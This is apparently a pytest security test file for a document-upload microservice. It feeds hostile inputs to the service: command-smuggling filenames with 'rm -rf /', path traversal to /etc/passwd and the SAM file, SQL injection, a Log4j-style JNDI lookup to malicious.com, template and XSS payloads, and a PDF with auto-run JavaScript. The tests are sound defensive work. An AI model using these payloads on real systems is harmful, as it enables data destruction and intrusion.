"""
Security tests for document processing microservice.
"""

import pytest
import jwt
import time
from unittest.mock import patch, Mock
from uuid import uuid4


class TestAuthenticationSecurity:
    """Security tests for authentication and authorization."""

    @pytest.mark.security
    def test_missing_authentication_token(self, client):
        """Test that endpoints require authentication."""
        # Test endpoints that should require authentication
        protected_endpoints = [
            "/api/documents/status/test-id",
            "/api/documents/list?user_id=test",
            "/api/documents/test-id/metadata",
            "/api/documents/test-id/chunks",
        ]

        for endpoint in protected_endpoints:
            response = client.get(endpoint)
            # Should return 401 or 422 (validation error) without proper auth
            assert response.status_code in [401, 422]

    @pytest.mark.security
    def test_invalid_jwt_token(self, client):
        """Test behavior with invalid JWT tokens."""
        invalid_tokens = [
            "invalid.token.here",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature",
            "",
            "Bearer invalid_token",
            "malformed_token_without_bearer"
        ]

        for token in invalid_tokens:
            headers = {"Authorization": f"Bearer {token}"}
            response = client.get("/api/documents/status/test-id", headers=headers)
            # Should reject invalid tokens
            assert response.status_code in [401, 422]

    @pytest.mark.security
    def test_expired_jwt_token(self, client):
        """Test behavior with expired JWT tokens."""
        # Create expired token
        expired_payload = {
            "sub": str(uuid4()),
            "exp": int(time.time()) - 3600  # Expired 1 hour ago
        }

        expired_token = jwt.encode(expired_payload, "secret", algorithm="HS256")
        headers = {"Authorization": f"Bearer {expired_token}"}

        response = client.get("/api/documents/status/test-id", headers=headers)
        assert response.status_code in [401, 422]

    @pytest.mark.security
    def test_user_access_isolation(self, client, test_user):
        """Test that users can only access their own documents."""
        other_user_id = str(uuid4())

        with patch('src.core.auth.get_current_user', return_value=test_user):
            # Try to access documents with different user_id in query
            response = client.get(f"/api/documents/list?user_id={other_user_id}")
            assert response.status_code == 403
            assert "can only list your own documents" in response.json()["detail"]

    @pytest.mark.security
    def test_document_ownership_verification(self, client, test_user, sample_document):
        """Test that document access is properly restricted by ownership."""
        # Create another user
        other_user = {
            "user_id": str(uuid4()),
            "email": "other@example.com"
        }

        # Try to access document as different user
        with patch('src.core.auth.get_current_user', return_value=other_user):
            response = client.get(f"/api/documents/status/{sample_document.id}")
            assert response.status_code == 404  # Should not find document for wrong user

    @pytest.mark.security
    def test_rate_limiting_protection(self, client, test_user):
        """Test rate limiting protection."""
        with patch('src.core.auth.check_rate_limit') as mock_rate_limit:
            # Simulate rate limit exceeded
            mock_rate_limit.side_effect = Exception("Rate limit exceeded")

            files = {"file": ("test.txt", b"content", "text/plain")}
            data = {
                "user_id": test_user["user_id"],
                "session_id": test_user["session_id"],
                "metadata": "{}",
                "tags": "[]"
            }

            response = client.post("/api/documents/upload", files=files, data=data)
            # Should be rejected due to rate limiting
            assert response.status_code >= 400


class TestInputValidationSecurity:
    """Security tests for input validation and sanitization."""

    @pytest.mark.security
    def test_file_type_validation(self, client, test_user):
        """Test that dangerous file types are rejected."""
        dangerous_files = [
            ("malware.exe", b"MZ\x90\x00", "application/x-executable"),
            ("script.bat", b"@echo off\nformat c:", "application/x-msdos-program"),
            ("virus.scr", b"virus content", "application/octet-stream"),
            ("hack.com", b"command content", "application/octet-stream"),
        ]

        with patch('src.core.auth.check_rate_limit', return_value=test_user):
            for filename, content, mime_type in dangerous_files:
                files = {"file": (filename, content, mime_type)}
                data = {
                    "user_id": test_user["user_id"],
                    "session_id": test_user["session_id"],
                    "metadata": "{}",
                    "tags": "[]"
                }

                response = client.post("/api/documents/upload", files=files, data=data)
                assert response.status_code == 400

    @pytest.mark.security
    def test_malicious_filename_handling(self, client, test_user):
        """Test handling of malicious filenames."""
        malicious_filenames = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "file|rm -rf /",
            "file`rm -rf /`",
            "file$(rm -rf /)",
            "file\x00.txt",  # Null byte injection
            "file\r\n.txt",  # CRLF injection
            "file<script>alert('xss')</script>.txt",
        ]

        with patch('src.core.auth.check_rate_limit', return_value=test_user), \
             patch('src.core.auth.PermissionChecker.check_storage_quota', return_value=True):

            for filename in malicious_filenames:
                files = {"file": (filename, b"safe content", "text/plain")}
                data = {
                    "user_id": test_user["user_id"],
                    "session_id": test_user["session_id"],
                    "metadata": "{}",
                    "tags": "[]"
                }

                # Should either reject the file or sanitize the filename
                response = client.post("/api/documents/upload", files=files, data=data)
                # Could be 400 (rejected) or 200 (sanitized and accepted)
                assert response.status_code in [200, 400]

    @pytest.mark.security
    def test_oversized_file_rejection(self, client, test_user):
        """Test that oversized files are rejected."""
        with patch('src.core.auth.check_rate_limit', return_value=test_user):
            # Create file larger than allowed size
            large_content = b"x" * (100 * 1024 * 1024)  # 100MB
            files = {"file": ("large.txt", large_content, "text/plain")}
            data = {
                "user_id": test_user["user_id"],
                "session_id": test_user["session_id"],
                "metadata": "{}",
                "tags": "[]"
            }

            response = client.post("/api/documents/upload", files=files, data=data)
            assert response.status_code == 400
            assert "exceeds maximum" in response.json()["detail"]

    @pytest.mark.security
    def test_json_injection_in_metadata(self, client, test_user, malicious_file_content):
        """Test handling of malicious JSON in metadata fields."""
        malicious_json_strings = [
            '{"__proto__": {"admin": true}}',  # Prototype pollution
            '{"constructor": {"prototype": {"admin": true}}}',
            '{"eval": "alert(\\"xss\\")"}',
            '{"script": "<script>alert(\\"xss\\")</script>"}',
            '{"$where": "function() { return true; }"}',  # NoSQL injection attempt
        ]

        with patch('src.core.auth.check_rate_limit', return_value=test_user):
            for malicious_json in malicious_json_strings:
                files = {"file": ("test.txt", b"content", "text/plain")}
                data = {
                    "user_id": test_user["user_id"],
                    "session_id": test_user["session_id"],
                    "metadata": malicious_json,
                    "tags": "[]"
                }

                response = client.post("/api/documents/upload", files=files, data=data)
                # Should either reject or sanitize the malicious JSON
                if response.status_code == 200:
                    # If accepted, ensure malicious content is not in response
                    response_text = response.text.lower()
                    assert "<script>" not in response_text
                    assert "alert" not in response_text

    @pytest.mark.security
    def test_sql_injection_attempts(self, client, test_user):
        """Test protection against SQL injection attempts."""
        sql_injection_strings = [
            "'; DROP TABLE documents; --",
            "' UNION SELECT * FROM profiles --",
            "' OR '1'='1",
            "'; UPDATE documents SET user_id='attacker' --",
            "admin'/*",
            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
        ]

        with patch('src.core.auth.get_current_user', return_value=test_user):
            for injection_string in sql_injection_strings:
                # Try injection in various parameters
                response = client.get(f"/api/documents/list?user_id={injection_string}")
                # Should either return 400 (validation error) or process safely
                if response.status_code == 200:
                    data = response.json()
                    # Should not return unexpected data structure
                    assert "documents" in data
                    assert isinstance(data["documents"], list)

    @pytest.mark.security
    def test_path_traversal_prevention(self, client, test_user):
        """Test prevention of path traversal attacks."""
        path_traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\hosts",
            "/etc/passwd",
            "C:\\windows\\system32\\config\\sam",
            "file:///etc/passwd",
            "//shared/file",
        ]

        with patch('src.core.auth.get_current_user', return_value=test_user):
            for path in path_traversal_attempts:
                # Try to use path traversal in document ID
                response = client.get(f"/api/documents/status/{path}")
                # Should return 404 or 422 (validation error), not expose files
                assert response.status_code in [404, 422]


class TestFileContentSecurity:
    """Security tests for file content processing."""

    @pytest.mark.security
    def test_malicious_pdf_handling(self, client, test_user):
        """Test handling of potentially malicious PDF files."""
        # Create PDF with potentially malicious content
        malicious_pdf = b"""%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction [3 0 R /JS (app.alert("XSS");)]
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
>>
endobj
xref
0 4
0000000000 65535 f
0000000009 00000 n
0000000074 00000 n
0000000120 00000 n
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
173
%%EOF"""

        with patch('src.core.auth.check_rate_limit', return_value=test_user), \
             patch('src.core.auth.PermissionChecker.check_storage_quota', return_value=True):

            files = {"file": ("malicious.pdf", malicious_pdf, "application/pdf")}
            data = {
                "user_id": test_user["user_id"],
                "session_id": test_user["session_id"],
                "metadata": "{}",
                "tags": "[]"
            }

            response = client.post("/api/documents/upload", files=files, data=data)
            # Should either reject the file or process it safely
            assert response.status_code in [200, 400]

    @pytest.mark.security
    def test_zip_bomb_protection(self, client, test_user):
        """Test protection against zip bomb attacks in DOCX files."""
        # DOCX files are ZIP archives, so they could contain zip bombs
        with patch('src.core.auth.check_rate_limit', return_value=test_user):
            # Simulate a DOCX file that's actually a ZIP bomb
            zip_bomb_content = b"PK\x03\x04" + b"0" * 1000  # Fake ZIP header + data

            files = {"file": ("zipbomb.docx", zip_bomb_content, "application/vnd.openxmlformats-officedocument.wordprocessingml.document")}
            data = {
                "user_id": test_user["user_id"],
                "session_id": test_user["session_id"],
                "metadata": "{}",
                "tags": "[]"
            }

            response = client.post("/api/documents/upload", files=files, data=data)
            # Should reject malformed DOCX files
            assert response.status_code == 400

    @pytest.mark.security
    def test_script_injection_in_text_files(self, client, test_user):
        """Test handling of script injection in text files."""
        malicious_scripts = [
            b"<script>alert('xss')</script>",
            b"javascript:alert('xss')",
            b"{{7*7}}",  # Template injection
            b"${jndi:ldap://malicious.com/a}",  # Log4j style injection
            b"<%=system('rm -rf /')%>",  # Server-side script
        ]

        with patch('src.core.auth.check_rate_limit', return_value=test_user), \
             patch('src.core.auth.PermissionChecker.check_storage_quota', return_value=True), \
             patch('src.tasks.document_tasks.process_document') as mock_task:

            mock_task.delay.return_value.id = "test_job"

            for script in malicious_scripts:
                files = {"file": ("malicious.txt", script, "text/plain")}
                data = {
                    "user_id": test_user["user_id"],
                    "session_id": test_user["session_id"],
                    "metadata": "{}",
                    "tags": "[]"
                }

                response = client.post("/api/documents/upload", files=files, data=data)
                # Should accept text files but process them safely
                assert response.status_code == 200

    @pytest.mark.security
    def test_binary_content_in_text_files(self, client, test_user):
        """Test handling of binary content masquerading as text."""
        # Binary content that might cause issues
        binary_contents = [
            b"\x00\x01\x02\x03\x04\x05",  # Null bytes and control characters
            b"\xFF\xFE\x00\x00",  # BOM markers
            b"\x89PNG\r\n\x1a\n",  # PNG header in .txt file
            b"MZ\x90\x00",  # PE executable header
        ]

        with patch('src.core.auth.check_rate_limit', return_value=test_user), \
             patch('src.core.auth.PermissionChecker.check_storage_quota', return_value=True), \
             patch('src.tasks.document_tasks.process_document') as mock_task:

            mock_task.delay.return_value.id = "test_job"

            for binary_content in binary_contents:
                files = {"file": ("binary.txt", binary_content, "text/plain")}
                data = {
                    "user_id": test_user["user_id"],
                    "session_id": test_user["session_id"],
                    "metadata": "{}",
                    "tags": "[]"
                }

                response = client.post("/api/documents/upload", files=files, data=data)
                # Should handle binary content gracefully
                assert response.status_code in [200, 400]


class TestAPISecurityHeaders:
    """Test security headers and CORS configuration."""

    @pytest.mark.security
    def test_cors_headers_present(self, client):
        """Test that CORS headers are properly configured."""
        response = client.options("/api/health")

        # Check for CORS headers
        headers = response.headers
        assert "access-control-allow-origin" in headers
        assert "access-control-allow-methods" in headers
        assert "access-control-allow-headers" in headers

    @pytest.mark.security
    def test_security_headers_present(self, client):
        """Test that security headers are present."""
        response = client.get("/api/health")

        # While FastAPI doesn't add these by default, we should consider them
        headers = response.headers

        # Content-Type should be set
        assert "content-type" in headers

        # Server header should not reveal too much information
        if "server" in headers:
            server_header = headers["server"].lower()
            assert "uvicorn" not in server_header or "fastapi" not in server_header

    @pytest.mark.security
    def test_error_information_disclosure(self, client):
        """Test that errors don't disclose sensitive information."""
        # Test with malformed requests
        response = client.post("/api/documents/upload")  # Missing required data

        assert response.status_code >= 400
        error_response = response.json()

        # Error should not contain sensitive paths or system information
        error_text = str(error_response).lower()
        sensitive_terms = [
            "/home/", "/var/", "/etc/", "c:\\", "database", "password",
            "secret", "key", "token", "internal", "traceback"
        ]

        for term in sensitive_terms:
            assert term not in error_text

    @pytest.mark.security
    def test_http_method_restrictions(self, client):
        """Test that endpoints only accept appropriate HTTP methods."""
        # Health endpoint should only accept GET
        response = client.post("/api/health")
        assert response.status_code == 405  # Method Not Allowed

        # Upload endpoint should only accept POST
        response = client.get("/api/documents/upload")
        assert response.status_code == 405

        # Delete endpoint should only accept DELETE
        response = client.post("/api/documents/test-id")
        assert response.status_code in [404, 405]  # Not Found or Method Not Allowed


class TestStorageQuotaSecurity:
    """Test storage quota and resource limit security."""

    @pytest.mark.security
    def test_storage_quota_enforcement(self, client, test_user):
        """Test that storage quotas are properly enforced."""
        with patch('src.core.auth.check_rate_limit', return_value=test_user), \
             patch('src.core.auth.PermissionChecker.check_storage_quota', return_value=False):

            files = {"file": ("test.txt", b"content", "text/plain")}
            data = {
                "user_id": test_user["user_id"],
                "session_id": test_user["session_id"],
                "metadata": "{}",
                "tags": "[]"
            }

            response = client.post("/api/documents/upload", files=files, data=data)

            assert response.status_code == 402  # Payment Required
            assert "quota exceeded" in response.json()["detail"].lower()

    @pytest.mark.security
    def test_concurrent_upload_abuse_prevention(self, client, test_user):
        """Test prevention of concurrent upload abuse."""
        # This would normally be handled by rate limiting
        # Here we test that the system handles multiple concurrent requests gracefully

        with patch('src.core.auth.check_rate_limit', return_value=test_user), \
             patch('src.core.auth.PermissionChecker.check_storage_quota', return_value=True):

            files = {"file": ("test.txt", b"content", "text/plain")}
            data = {
                "user_id": test_user["user_id"],
                "session_id": test_user["session_id"],
                "metadata": "{}",
                "tags": "[]"
            }

            # Make multiple requests
            responses = []
            for _ in range(10):
                response = client.post("/api/documents/upload", files=files, data=data)
                responses.append(response)

            # Should handle all requests gracefully (either accept or reject with proper status)
            for response in responses:
                assert response.status_code in [200, 400, 429]  # OK, Bad Request, or Too Many Requests